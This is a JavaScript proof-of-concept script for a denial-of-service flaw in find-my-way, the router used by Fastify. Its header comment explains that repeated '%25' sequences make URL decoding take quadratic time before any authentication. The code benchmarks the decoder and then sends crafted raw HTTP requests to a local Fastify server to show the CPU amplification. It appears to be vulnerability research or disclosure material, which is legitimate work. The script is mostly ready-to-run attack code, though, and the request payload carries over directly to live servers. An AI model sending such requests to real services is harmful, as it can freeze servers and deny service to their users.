'use strict'
/*
 * PoC — B1: O(n^2) URL-decode DoS in find-my-way (Fastify's router)
 * ---------------------------------------------------------------------------
 * find-my-way's safeDecodeURI (node_modules/find-my-way/lib/url-sanitizer.js:66)
 * rebuilds the ENTIRE path string on every `%25` occurrence:
 *
 *     path = path.slice(0, i + 1) + '25' + path.slice(i + 1)
 *
 * inside the per-character loop -> O(n^2) for a path made of repeated `%25`.
 * This runs UNCONDITIONALLY on every request, pre-auth, before hooks/handlers
 * and before `maxParamLength` is checked. Any path (including 404s) triggers it.
 *
 * This script demonstrates two things:
 *   PART A - the raw O(n^2) scaling of safeDecodeURI (unit level), which shows
 *            the seconds-to-minutes cost reachable when the URL length limit is
 *            raised (a common ops setting for large JWT/cookie apps via
 *            --max-http-header-size).
 *   PART B - the end-to-end behaviour on a real Fastify server under DEFAULT
 *            config: a per-request amplification, and the 16 KB URL cap (431)
 *            that bounds the single-request cost by default.
 *
 *   Run:  node poc.js
 */
const path = require('path')
const net = require('net')
const { safeDecodeURI } = require(path.join(__dirname, '..', '..', 'node_modules', 'find-my-way', 'lib', 'url-sanitizer.js'))
const Fastify = require(path.join(__dirname, '..', '..', 'fastify.js'))

console.log('=== B1 PoC: %25 O(n^2) URL-decode DoS ===\n')

// ---------------------------------------------------------------------------
// PART A — raw algorithmic scaling of safeDecodeURI (unit level)
// ---------------------------------------------------------------------------
function bench (repeats) {
  const p = '/' + '%25'.repeat(repeats) // path length ~= 3*repeats
  safeDecodeURI(p, false) // warm
  const iters = 10
  const t = process.hrtime.bigint()
  for (let k = 0; k < iters; k++) safeDecodeURI(p, false)
  return Number(process.hrtime.bigint() - t) / 1e6 / iters
}
function benign (len) {
  const p = '/' + 'a'.repeat(len)
  const t = process.hrtime.bigint()
  for (let k = 0; k < 10; k++) safeDecodeURI(p, false)
  return Number(process.hrtime.bigint() - t) / 1e6 / 10
}

console.log('PART A — safeDecodeURI() cost vs. path length (repeated %25):')
let prev = 0
for (const r of [1000, 2000, 5000, 10000, 20000, 40000]) {
  const ms = bench(r)
  const ratio = prev ? (ms / prev).toFixed(2) + 'x vs prev' : 'baseline'
  console.log(`   ${String(r * 3).padStart(6)} chars  ->  ${ms.toFixed(2).padStart(9)} ms   (${ratio})`)
  prev = ms
}
console.log(`   (benign path of 60000 plain chars -> ${benign(60000).toFixed(2)} ms)`)
console.log('   Doubling the length ~4x the time => O(n^2). With a raised')
console.log('   --max-http-header-size, a single request costs seconds-to-minutes.\n')

// ---------------------------------------------------------------------------
// PART B — end-to-end on a real Fastify server (DEFAULT config)
// ---------------------------------------------------------------------------
const app = Fastify({ logger: false })
app.get('/*', async () => ({ ok: true }))

function rawGet (port, target) {
  return new Promise((resolve) => {
    const t0 = process.hrtime.bigint()
    const s = net.connect(port, '127.0.0.1', () => s.write(`GET ${target} HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n`))
    let buf = ''
    s.on('data', (d) => (buf += d.toString('latin1')))
    s.on('close', () => resolve({ ms: Number(process.hrtime.bigint() - t0) / 1e6, status: (buf.match(/HTTP\/1\.1 (\d+)/) || [])[1] }))
    s.on('error', () => resolve({ ms: -1, status: 'ERR' }))
  })
}

app.listen({ port: 0, host: '127.0.0.1' }).then(async () => {
  const port = app.server.address().port
  console.log('PART B — end-to-end on a real server (default 16 KB URL cap):')
  const benignReq = await rawGet(port, '/' + 'a'.repeat(15000))
  const evil15k = await rawGet(port, '/' + '%25'.repeat(5000))   // ~15 KB (fits)
  const evilOver = await rawGet(port, '/' + '%25'.repeat(6000))  // ~18 KB (over cap)
  console.log(`   benign 15 KB URL   -> HTTP ${benignReq.status}  in ${benignReq.ms.toFixed(1)} ms`)
  console.log(`   %25    15 KB URL   -> HTTP ${evil15k.status}  in ${evil15k.ms.toFixed(1)} ms  (amplified)`)
  console.log(`   %25   ~18 KB URL   -> HTTP ${evilOver.status}  in ${evilOver.ms.toFixed(1)} ms  (Node URL cap -> 431)\n`)
  console.log('==> CONFIRMED: pre-auth, per-request quadratic CPU. Default config = amplification')
  console.log('    flood (each 16 KB request burns ~ms and blocks the single event-loop thread);')
  console.log('    with a raised header/URL limit it becomes a one-shot multi-second freeze.')
  app.close(); process.exit(0)
})
